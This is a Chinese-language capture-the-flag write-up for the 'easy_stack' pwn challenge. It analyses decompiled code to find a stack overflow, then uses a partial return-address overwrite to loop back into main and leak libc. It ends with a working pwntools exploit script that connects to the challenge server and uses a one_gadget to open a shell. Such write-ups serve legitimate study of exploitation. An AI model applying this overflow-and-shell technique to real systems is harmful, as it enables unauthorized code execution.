# eonew easy_stack

### 0x0 前置补偿

`read()`函数测试

```c
# include <stdio.h>
# include <stdlib.h>
# include <unistd.h>
# include <string.h>

int main()
{
  char s[100];
  int cnt = read(0, s, 2);
  int cnt1;
  scanf("%d", &cnt1);
  printf("%s\n", s);
  printf("%d\n", strlen(s));
  printf("%d\n", cnt);
  printf("%d\n", cnt1);
  return 0;
}
```

```shell
➜  eonew python -c "print '\x001'" | ./1

0
2
0
```

`read()`遇到`\x00`就结束读取了。

### 0x1 分析

```shell
[*] './easy_stack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

地址随机化。但是没有CANARY。

程序逻辑很简单：

`main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-80h]

  alarm(0x3Cu);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  read_n(&s, 0x100uLL);
  puts(&s);
  return 0;
}
```

读取一个字符串到`s`，然后输出`s`。

`read_n()`

```c
// a2 == 0x100
void *__fastcall read_n(void *ptr, unsigned __int64 len)
{
  int v2; // eax
  char s[520]; // [rsp+10h] [rbp-210h]
  int v5; // [rsp+218h] [rbp-8h]
  int v6; // [rsp+21Ch] [rbp-4h]

  v6 = 0;
  if ( len > 0x200 )
  {
    puts("too long!");
    exit(-1);
  }
  do
  {
    read(0, &s[v6], 1uLL);
    if ( s[v6] == '\n' )
      break;
    if ( !s[v6] )
      break;
    v2 = v6++;
  }
  while ( len > v2 );
  if ( s[v6] == '\n' && len > v6 )           
    s[v6] = 0;
  v5 = strlen(s);
  return memcpy(ptr, s, v5);
}
```

这里看到每次`read()`读取一个字符，所以，遇到`\x00`和`\n`都会停止读取。

而且，读取的所有字符会拷贝回`main`的`s`。由于长度最大限制是`0x100`，会造成栈溢出。

**漏洞利用**

首先想到的是循环复用`main`来循环读取，但是地址随机化没办法直接使用IDA里的`main`地址。但是注意到ret上的返回地址`__libc_start_main`的地址是`0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax`可以覆盖一个低字节把`\x97`变成`\x90`，这样ret就会指向：

```assembly
.text:0000000000021B90                 mov     rax, [rsp+0B8h+var_A0]
.text:0000000000021B95                 call    rax
```

刚好可以回到调用`main`的地方。就可以又回到`main`了。

另外在`puts(s)`的时候会把这个地址输出，从而`leak libc`。可以在下次栈溢出来get shell。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux', log_level='debug')

def debug(p, cmd):
    gdb.attach(p, cmd)
    pause()

# p = process('./easy_stack')
p = remote('nc.eonew.cn', 10004)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  
libc = ELF('./libc-2.27.so')
gadget = 0x4f2c5

# leak libc
# debug(p, 'b *$rebase(0xa3c)\n')
payload = 'a'*0x88 + '\x90\x00'
p.send(payload)
p.recvuntil('a'*0x88)
ret = u64(p.recvuntil('\x7f').ljust(8, '\x00')) 
libc_base = ret + 7 - 231 - libc.symbols['__libc_start_main'] #  (__libc_start_main+231)
print ('ret: ', hex(ret))
print ('libc: ', hex(libc_base))
pause()

# one gadget
payload = 'a' * 0x88 + p64(libc_base + gadget)
p.send(payload)
p.interactive()
```

